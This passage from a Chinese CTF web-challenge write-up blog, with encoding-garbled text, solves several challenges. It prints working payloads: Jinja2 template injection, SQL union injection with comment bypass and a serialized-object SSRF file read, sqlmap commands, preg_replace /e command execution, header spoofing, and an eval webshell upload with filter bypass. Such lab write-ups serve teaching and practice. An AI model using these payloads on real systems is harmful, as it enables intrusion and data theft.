class="line"></span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(safe_jinja(shrine))</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>å®¡ä¸€ä¸‹ï¼Œå‘ç°â€™()â€™ä¼šè¢«æ›¿æ¢ä¸ºç©ºï¼Œåœ¨blacklistä¸­çš„ä¼šè¢«ç½®ä¸ºNoneï¼Œæäº¤çš„å‚æ•°åœ¨/shrine/çš„è·¯å¾„ä¸‹</p><p>ä¸‹é¢æ¥è¿›è¡Œä¸€ä¸‹æµ‹è¯•</p><img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/2.png" class="" title="examplename"><p>é€šè¿‡æŸ¥é˜…SSTIæ¨¡æ¿å¼•æ“æ³¨å…¥å›¾å¯ä»¥çŸ¥é“åº”è¯¥æ˜¯jinja2+flask</p><p>ç”±äºè¿™é‡Œçš„å˜é‡configè¢«ç¦ç”¨ï¼Œæš‚æ—¶æ²¡æƒ³åˆ°ä»€ä¹ˆåŠæ³•ï¼Œçœ‹äº†å…¶ä»–å¸ˆå‚…çš„wpï¼ŒçŸ¥é“äº†è¦ç”¨pythonçš„æ²™ç®±é€ƒé€¸æ–¹æ³•ï¼ŒæŸ¥äº†æœ‰å…³flaskçš„å†…ç½®å‡½æ•°ï¼Œä»¥ä¸‹æ˜¯èµ„æ–™</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url_for() : url_forä¼šæ ¹æ®ä¼ å…¥çš„è·¯ç”±å™¨å‡½æ•°åï¼Œè¿”å›è¯¥è·¯ç”±çš„URLï¼Œåœ¨æ¨¡æ¿ä¸­å§‹ç»ˆä½¿ç”¨url_forï¼ˆï¼‰å°±å¯ä»¥å®‰å…¨çš„ä¿®æ”¹è·¯ç”±ç»‘å®šçš„URLï¼Œåˆ™ä¸å¿…æ‹…å¿ƒæ¨¡æ¿ä¸­æ¸²æŸ“é”™çš„è¿æ¥ï¼Œ&#123;&#123;url_for(&#39;home&#39;)&#125;&#125; ï¼Œå¦‚æœæˆ‘ä»¬å®šä¹‰çš„è·¯ç”±URLæ˜¯å¸¦æœ‰å‚æ•°çš„ï¼Œåˆ™å¯ä»¥æŠŠä»–ä»¬ä½œä¸ºå…³é”®å­—å‚æ•°ä¼ å…¥url_forï¼ˆï¼‰ï¼ŒFlaskä¼šæŠŠä»–ä»¬å¡«å……è¿›æœ€ç»ˆç”Ÿæˆçš„URLä¸­ï¼Œ&#123;&#123;url_for(&#39;post&#39;,post_id&#x3D;1)&#125;&#125;</span><br><span class="line"></span><br><span class="line">get_flashed_messages():è¿™ä¸ªå‡½æ•°ä¼šè¿”å›ä¹‹å‰åœ¨flaskä¸­é€šè¿‡flaskï¼ˆï¼‰ä¼ å…¥çš„æ¶ˆæ¯çš„åˆ—è¡¨ï¼Œflashå‡½æ•°çš„ä½œç”¨å¾ˆç®€å•ï¼Œå¯ä»¥æŠŠç”±Pythonå­—ç¬¦ä¸²è¡¨ç¤ºçš„ä¿¡æ¯åŠ å…¥ä¸€ä¸ªæ¶ˆæ¯é˜Ÿåˆ—ä¸­ï¼Œåœ¨ä½¿get_flashed_message()å‡½æ•°å–å‡ºä»–ä»¬å¹¶æ¶ˆè´¹æ‰</span><br></pre></td></tr></table></figure><p>ä¸‹é¢ç”¨get_flashed_messages()çš„æ–¹æ³•</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:&#123;&#123;get_flashed_messages.__globals__&#125;&#125;</span><br></pre></td></tr></table></figure><img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/3.png" class="" title="examplename"><p>å¯ä»¥æ‰¾åˆ°current_app,ç»§ç»­æ³¨å…¥å½“å‰appçš„config</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:&#123;&#123;get_fiashed_messages.__globals__[&#39;current_app&#39;].config&#125;&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥æ‰¾åˆ°flagï¼Œè¿™é‡Œå°±ä¸è´´äº†</p><h4 id="0X03-fakebook-20-03-13"><a href="#0X03-fakebook-20-03-13" class="headerlink" title="0X03:fakebook 20-03-13"></a>0X03:fakebook 20-03-13</h4><p>æ‹¿åˆ°é¢˜ç›®ï¼Œscanå†²ä¸€å‘</p><img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/4.png" class="" title="examplename"><p>å‘ç°æœ‰robots.txtï¼Œè®¿é—®ï¼Œä¸‹è½½æºç user.php.bak</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">public</span> $age = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> $blog = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name, $age, $blog)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = (int)$age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;blog = $blog;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($url)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $ch = curl_init();</span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        $output = curl_exec($ch);</span><br><span class="line">        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>($httpCode == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close($ch);</span><br><span class="line">        <span class="keyword">return</span> $output;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> <span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="keyword">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> <span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $blog = <span class="keyword">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> preg_match(<span class="string">"/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i"</span>, $blog);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®¡é˜…æºç å‘ç°get()å¯èƒ½å­˜åœ¨ssrfæœåŠ¡ç«¯æ¥¼çš„é‚£ä¸ªï¼Œjoinä¸€ä¸ªè´¦å·,ç‚¹usernameé¡µé¢è·³è½¬ï¼Œå‘ç°ä¸€ä¸ªæ³¨å…¥ç‚¹</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://111.198.29.45:44796/view.php?no=1</span><br></pre></td></tr></table></figure><p>ä¸‹é¢å¼€å§‹æ³¨å…¥æµ‹è¯•ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">no=1 order by 5<span class="comment">#//æŠ¥é”™ï¼Œè¯´æ˜æ²¡æœ‰äº”ä¸ªå­—æ®µï¼Œå¹¶ä¸”çˆ†å‡ºäº†è·¯å¾„åœ¨ /var/www/html/db.phpä¸‹</span></span><br><span class="line">no=1 order by 5<span class="comment">#//æ­£å¸¸å›æ˜¾ï¼Œè¯´æ˜æ˜¯4ä¸ªå­—æ®µï¼Œä¸‹é¢å¼€å§‹çˆ†åº“</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œæœ‰ä¸€ä¸ªæ³¨æ„çš„åœ°æ–¹å°±æ˜¯,ç»è¿‡å¤šæ¬¡æµ‹è¯•å‘ç°union å’Œselectä¸èƒ½åŒæ—¶ä½¿ç”¨ï¼Œç”¨æ³¨é‡Š/**/è¿›è¡Œç»•è¿‡</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">no = -1 union<span class="comment">/**/</span><span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(schema_name),<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> information_schema.schemata<span class="comment">#//çˆ†å‡ºfakebookåº“</span></span><br><span class="line"><span class="keyword">no</span>= <span class="number">-1</span> <span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(table_name),<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'fakebook'</span><span class="comment">#//çˆ†å‡ºusersè¡¨</span></span><br><span class="line"><span class="keyword">no</span> = <span class="number">-1</span> <span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(column_name),<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span><span class="comment">#çˆ†å‡ºno,username,passwd,dataå­—æ®µ</span></span><br><span class="line">ä¸‹é¢å¯ä»¥ä¸€ä¸ªä¸ªæŸ¥è¯¢ä¿¡æ¯ï¼Œå¯ä»¥çœ‹åˆ°<span class="keyword">data</span>ä¸­çš„æ•°æ®è¿›è¡Œäº†åºåˆ—åŒ–</span><br><span class="line">O:8:"UserInfo":3&#123;s:4:"name";s:7:"hjfashd";s:3:"age";i:1123;s:4:"blog";s:13:"www.baidu.com";&#125;</span><br></pre></td></tr></table></figure><p>åœ¨ç›®å½•æ‰«æä¸­å¯ä»¥çœ‹åˆ°å­˜åœ¨flag.phpï¼Œå¯ä»¥æŠŠblogæ”¹ä¸º/var/www/html/flag.phpè·¯å¾„å°±å¯ä»¥æ‹¿åˆ°flagäº†,è¿™é‡Œè¿˜è¦æ³¨æ„ç”¨fileï¼š//åè®®æ¥è¯»å–,æ­¤å¤–dataåœ¨ç¬¬å››ä¸ªå­—æ®µï¼Œæ‰€ä»¥è¿™é‡ŒæŸ¥è¯¢æ—¶ä¹Ÿè¦æ”¾åœ¨ç¬¬å››ä½</p><p>åˆ°è¿™é‡Œï¼Œæˆ‘ä»¬å°±å¯ä»¥æ ¹æ®å·²çŸ¥çš„ä¿¡æ¯æ¥æ„é€ payload</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:no=-1 union<span class="comment">/**/</span><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="string">'O:8:"UserInfo":3:&#123;s:4:"name";s:3:"ggg";s:3:"age";i:12356;s:4:"blog";s:29:"file:///var/www/html/flag.php";&#125;'</span><span class="comment">#</span></span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹ç½‘é¡µæºç ï¼Œå¯ä»¥çœ‹åˆ°</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">src='data:text/html;base64,PD9waHANCg0KJGZsYWcgPSAiZmxhZ3tjMWU1NTJmZGY3NzA0OWZhYmY2NTE2OGYyMmY3YWVhYn0iOw0KZXhpdCgwKTsNCg=='&gt;//base64è§£ç å°±å¯ä»¥äº†</span><br></pre></td></tr></table></figure><h4 id="0X04ics-04-20-03-14"><a href="#0X04ics-04-20-03-14" class="headerlink" title="0X04ics-04 20-03-14"></a>0X04ics-04 20-03-14</h4><p>æ ¹æ®é¢˜ç›®æè¿°ï¼Œåœ¨æ³¨å†Œå’Œç™»å½•é¡µé¢å­˜åœ¨æ¼æ´ï¼Œæ³¨å†Œä¸€ä¸ªè´¦å·ç™»å½•ï¼Œæç¤ºè¯´æ™®é€šç”¨æˆ·ç™»å½•æˆåŠŸä½†æ²¡ä»€ä¹ˆç”¨ï¼Œçœ‹æ¥æ˜¯è¦æ‹¿åˆ°ç®¡ç†å‘˜çš„è´¦å·ï¼Œè¿™é‡Œæœ‰ä¸ªå¿˜è®°å¯†ç çš„é¡µé¢ï¼Œä½†å¥½åƒæš‚æ—¶æ²¡ä»€ä¹ˆç”¨</p><p>ä¸Šå·¥å…·ï¼Œç”¨sqlmapè¿›è¡Œå°è¯•</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u &quot;http:&#x2F;&#x2F;111.198.29.45:51961&#x2F;findpwd.php&quot; --data&#x3D;&quot;username&#x3D;a&quot; --dbs&#x2F;&#x2F;çˆ†å‡ºäº†å››ä¸ªåº“ï¼Œç»è¿‡å°è¯•å‘ç°æ‰€è¦çš„æ•°æ®åœ¨cetc004ä¸­</span><br><span class="line">sqlmap.py -u &quot;http:&#x2F;&#x2F;111.198.29.45:51961&#x2F;findpwd.php&quot; --data&#x3D;&quot;username&#x3D;a&quot; -D cetc004 --tables&#x2F;&#x2F;çˆ†å‡ºuserè¡¨</span><br><span class="line">sqlmap.py -u &quot;http:&#x2F;&#x2F;111.198.29.45:51961&#x2F;findpwd.php&quot; --data&#x3D;&quot;username&#x3D;a&quot; -D cetc004 -T user --columns&#x2F;&#x2F;çˆ†å‡ºå››ä¸ªå­—æ®µï¼Œanswerï¼Œquestionï¼Œpasswordï¼Œusername</span><br></pre></td></tr></table></figure><img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/5.png" class="" title="examplename"><p>å¯ä»¥çœ‹åˆ°å·²ç»å­˜åœ¨çš„è´¦æˆ·ä¿¡æ¯ï¼Œå¯†ç è¢«åŠ å¯†äº†ï¼Œæœªæ‰¾åˆ°è§£å¯†æ–¹æ³•ï¼Œå›åˆ°æ³¨å†Œå’Œç™»å½•é¡µé¢</p><p>ç»è¿‡æµ‹è¯•å‘ç°æ³¨å†Œé¡µé¢ç›¸åŒçš„è´¦æˆ·åå¯ä»¥æ³¨å†Œå¤šæ¬¡ï¼Œç™»å½•ç•Œé¢åŒè´¦æˆ·ä¸åŒå¯†ç éƒ½å¯ä»¥æˆåŠŸç™»å½•</p><p>æ³¨å†Œä¸€ä¸ªåä¸ºc3tlwDmIn23çš„æ–°è´¦æˆ·ç™»å½•å°±èƒ½æ‹¿åˆ°flag</p><h4 id="0X05ics-05-20-03-14"><a href="#0X05ics-05-20-03-14" class="headerlink" title="0X05ics-05 20-03-14"></a>0X05ics-05 20-03-14</h4><p>æ‹¿åˆ°é¢˜ç›®åœ¨<code>http://111.198.29.45:59907/index.php?page=1</code>å‘ç°æ³¨å…¥ç‚¹ï¼Œçœ‹åˆ°åˆ°å˜é‡ä¼ å‚ï¼Œæœ‰å¯èƒ½å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´è¯»å–æºç ï¼Œåˆæ˜¯phpç«™ï¼Œæƒ³åˆ°ä½¿ç”¨phpä¼ªåè®®è¯»å–æºç </p><p><code>http://111.198.29.45:59907/index.php?page=php://filter/read=convert.base64-encode/resource=index.php</code></p><p>base64è§£å¯†ï¼Œæ•´ç†ä¸€ä¸‹æºç ï¼Œè¿™é‡Œå°±åªé™„ä¸Šé‡ç‚¹éƒ¨åˆ†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>] === <span class="string">'127.0.0.1'</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br &gt;Welcome My Admin ! &lt;br &gt;"</span>;</span><br><span class="line">    $pattern = $_GET[pat];</span><br><span class="line">    $replacement = $_GET[rep];</span><br><span class="line">    $subject = $_GET[sub];</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($pattern) &amp;&amp; <span class="keyword">isset</span>($replacement) &amp;&amp; <span class="keyword">isset</span>($subject)) &#123;</span><br><span class="line">        preg_replace($pattern, $replacement, $subject);</span><br><span class="line">    &#125;<span class="keyword">else</span></span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°é¦–å…ˆæ˜¯ä¸€ä¸ªåˆ¤æ–­ï¼Œä¹Ÿå°±æ˜¯è®¿é—®æ˜¯å¦æ¥è‡ªæœ¬æœºï¼Œç”¨X-Forwarded-Forè¿›è¡Œä¼ªé€ å³å¯</p><p>å†æ¥åˆ†æä¸€ä¸‹ä¸»é¢˜éƒ¨åˆ†ï¼Œé€šè¿‡getä¼ å…¥patternã€replacementã€subjectä¸‰ä¸ªå‚æ•°çš„å€¼ï¼Œé€šè¿‡preg_replace()å‡½æ•°ï¼Œåœ¨subjectæ‰¾æŒ‡å®šçš„patternéƒ¨åˆ†ç”¨replacementæ¥è¿›è¡Œæ›¿ä»£</p><p>é€šè¿‡æŸ¥æ‰¾èµ„æ–™äº†è§£äº†preg_replaceå‡½æ•°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">reg_replace å‡½æ•°æ‰§è¡Œä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼çš„æœç´¢å’Œæ›¿æ¢</span><br><span class="line">mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit &#x3D; -1 [, int &amp;$count ]] )</span><br><span class="line">æœç´¢ subject ä¸­åŒ¹é… pattern çš„éƒ¨åˆ†ï¼Œ ä»¥ replacement è¿›è¡Œæ›¿æ¢ã€‚</span><br><span class="line">â€¢ $pattern: è¦æœç´¢çš„æ¨¡å¼ï¼Œå¯ä»¥æ˜¯å­—ç¬¦ä¸²æˆ–ä¸€ä¸ªå­—ç¬¦ä¸²æ•°ç»„ã€‚</span><br><span class="line">â€¢ $replacement: ç”¨äºæ›¿æ¢çš„å­—ç¬¦ä¸²æˆ–å­—ç¬¦ä¸²æ•°ç»„ã€‚</span><br><span class="line">â€¢ $subject: è¦æœç´¢æ›¿æ¢çš„ç›®æ ‡å­—ç¬¦ä¸²æˆ–å­—ç¬¦ä¸²æ•°ç»„ã€‚</span><br><span class="line">â€¢ $limit: å¯é€‰ï¼Œå¯¹äºæ¯ä¸ªæ¨¡å¼ç”¨äºæ¯ä¸ª subject å­—ç¬¦ä¸²çš„æœ€å¤§å¯æ›¿æ¢æ¬¡æ•°ã€‚ é»˜è®¤æ˜¯-1ï¼ˆæ— é™åˆ¶ï¼‰ã€‚</span><br><span class="line">â€¢ $count: å¯é€‰ï¼Œä¸ºæ›¿æ¢æ‰§è¡Œçš„æ¬¡æ•°ã€‚</span><br><span class="line">è¿™ä¸ªå‡½æ•°æœ‰ä¸ªæ¼æ´</span><br><span class="line">å½“$patternä½¿ç”¨äº†&#x2F;eä¿®æ­£ç¬¦ï¼Œæ›¿æ¢çš„æ—¶å€™ä¼šæŠŠ$replacementæ›¿æ¢è¿›å»çš„ä»£ç å½“æˆphpä»£ç æ‰§è¡Œï¼Œå½“ç„¶è¦æ„æˆåˆæ³•çš„phpä»£ç æ‰èƒ½æ­£ç¡®æ‰§è¡Œã€‚</span><br></pre></td></tr></table></figure><p>æ€è·¯å‡ºæ¥äº†ï¼Œç”¨burpæŠ“åŒ…</p><img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/6.png" class="" title="examplename"><p>å¯ä»¥çœ‹åˆ°é¡µé¢æˆåŠŸå›æ˜¾äº†</p><img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/7.png" class="" title="examplename"><p><code>index.php?pat=/test/e&amp;&amp;rep=system(&quot;ls&quot;)&amp;&amp;sub=test</code></p><img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/8.png" class="" title="examplename"><p>ä¸‹é¢ä¸€æ­¥éœ€è¦æ³¨æ„ï¼Œç”±äºè¿™é‡Œå¯¹ç©ºæ ¼è¿›è¡Œäº†å¤„ç†ï¼Œå¯ä»¥ç”¨+æˆ–è€…%20æ¥æ›¿ä»£ï¼Œâ€œ&amp;â€ç”¨%26æ›¿ä»£</p><p><code>index.php?pat=/test/e&amp;&amp;rep=system(&quot;cd+s3chahahaDir%26%26+ls&quot;)&amp;&amp;sub=test</code></p><img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/9.png" class="" title="examplename"><p><code>index.php?pat=/test/e&amp;&amp;rep=system(&quot;cd+s3chahahaDir/flag%26%26+ls&quot;)&amp;&amp;sub=test</code></p><p>æ‰¾åˆ°äº†flag.phpæ–‡ä»¶ï¼Œè¿™é‡Œå°±ä¸è´´å›¾äº†</p><p>æœ€åç”¨catæ¥è¯»å–<code>index.php?pat=/test/e&amp;&amp;rep=system(&quot;cat+s3chahahaDir/flag/flag.php&quot;)&amp;&amp;sub=test</code></p><h4 id="0X06Bug-20-03-15"><a href="#0X06Bug-20-03-15" class="headerlink" title="0X06Bug  20-03-15"></a>0X06Bug  20-03-15</h4><p>æ‰“å¼€é¢˜ç›®åœºæ™¯æ˜¯ä¸€ä¸ªç™»å½•ç•Œé¢ï¼Œæœ‰æ³¨å†Œå’Œä¿®æ”¹å¯†ç çš„é€‰é¡¹ï¼Œå…ˆæ³¨å†Œä¸€ä¸ªè´¦å·ç™»å½•ä¸Šå»çœ‹çœ‹</p><img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/10.png" class="" title="examplename"><p>ç‚¹å‡»manageé€‰é¡¹ï¼Œæ— æ³•æ‰“å¼€ï¼Œæœ‰å¼¹çª—æç¤ºï¼šYou are not admin,å¾ˆæ˜æ˜¾éœ€è¦ç®¡ç†å‘˜è´¦å·ç™»å½•ï¼Œä½†æ˜¯æ³¨å†Œæ—¶æ˜¾ç¤ºè´¦å·å·²å­˜åœ¨ï¼Œçœ‹æ¥å…³é”®ç‚¹åœ¨ä¿®æ”¹å¯†ç çš„é¡µé¢ï¼ŒæŠ“åŒ…ï¼ŒæˆåŠŸå°†useræ”¹æˆadminï¼Œå†æ¬¡ç™»å½•ï¼Œç‚¹å‡»manageï¼Œæç¤ºIp not Allowed,æŠ“åŒ…ï¼ŒåŠ ä¸ŠX-Forwarded-For:127.0.0.1,æˆåŠŸæ‰“å¼€ï¼Œæ²¡ä»€ä¹ˆæç¤ºï¼ŒæŸ¥çœ‹ç½‘é¡µæºç ï¼Œå‘ç°ä¿¡æ¯</p><img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/11.png" class="" title="examplename"><p>æ ¹æ®æç¤ºä¼ å…¥å‚æ•°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;111.198.29.45:39291&#x2F;index.php?module&#x3D;filemanage&amp;do&#x3D;1&#x2F;&#x2F;æç¤ºaction is not correct</span><br><span class="line">å°è¯•å°†doæ”¹æˆdownloadï¼Œreadï¼Œwriteï¼Œuploadï¼Œæœ€åå‘ç°æ—¶upload</span><br></pre></td></tr></table></figure><img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/12.png" class="" title="examplename"><p>æ¥ä¸‹æ¥å°±æ˜¯ä¸Šä¼ æ–‡ä»¶</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">åœ¨æµ‹è¯•ä¸­å‘ç°æœ‰&lt;?phpä¼šæŠ¥é”™ï¼Œè¿™å°±æƒ³åˆ°ç”¨phpçš„è„šæœ¬æ¨¡å¼</span><br><span class="line">æ„é€ å†…å®¹:</span><br><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt;@eval($_POST[&quot;cmd&quot;])&lt;&#x2F;script&gt;ä»¥phpåç¼€ä¸Šä¼ ï¼ŒburpæŠ“åŒ…</span><br></pre></td></tr></table></figure><img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/13.png" class="" title="examplename"><p>æ ¹æ®æç¤ºå°è¯•åç¼€åçš„ç»•è¿‡ï¼Œåœ¨è¿‡ç¨‹ä¸­å‘ç°å¯¹Content-Typeæœ‰è¿›è¡Œæ£€æµ‹ï¼Œå°†å…¶æ”¹ä¸ºimage/jpegï¼Œåç¼€ååœ¨å·²çŸ¥çš„ç»•è¿‡æ–¹æ³•ä¸­æœ€åå‘ç°php4|php5å¯ä»¥ï¼ŒæˆåŠŸæ‹¿åˆ°flag</p><h4 id="0X07ics-07-20-03-18"><a href="#0X07ics-07-20-03-18" class="headerlink" title="0X07ics-07 20-03-18"></a>0X07ics-07 20-03-18</h4><p>æ‰“å¼€ç•Œé¢ï¼Œå‘ç°é¡¹ç›®ç®¡ç†é¡µé¢æœ‰è·³è½¬ï¼Œæœ‰view-sourceå¯ä»¥çœ‹æºä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[id]) &amp;&amp; floatval($_GET[id]) !== <span class="string">'1'</span> &amp;&amp; substr($_GET[id], <span class="number">-1</span>) === <span class="string">'9'</span>) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="string">'config.php'</span>;</span><br><span class="line">        $id = mysql_real_escape_string($_GET[id]);</span><br><span class="line">        $sql=<span class="string">"select * from cetc007.user where id='$id'"</span>;</span><br><span class="line">        $result = mysql_query($sql);</span><br><span class="line">        $result = mysql_fetch_object($result);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $result = <span class="keyword">False</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(!$result)<span class="keyword">die</span>(<span class="string">"&lt;br &gt;something wae wrong ! &lt;br&gt;"</span>);</span><br><span class="line">      <span class="keyword">if</span>($result)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"id: "</span>.$result-&gt;id.<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"name:"</span>.$result-&gt;user.<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">        $_SESSION[<span class="string">'admin'</span>] = <span class="keyword">True</span>;</span><br><span class="line">      &#125;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">floatval($_GET[id]) !== <span class="string">'1'</span><span class="comment">//æµ®ç‚¹æ•°ä¸èƒ½ä¸º1</span></span><br><span class="line">substr($_GET[id], <span class="number">-1</span>) === <span class="string">'9'</span>)<span class="comment">//idçš„å€’æ•°æœ€åä¸€ä¸ªæ•°ä¸º9</span></span><br><span 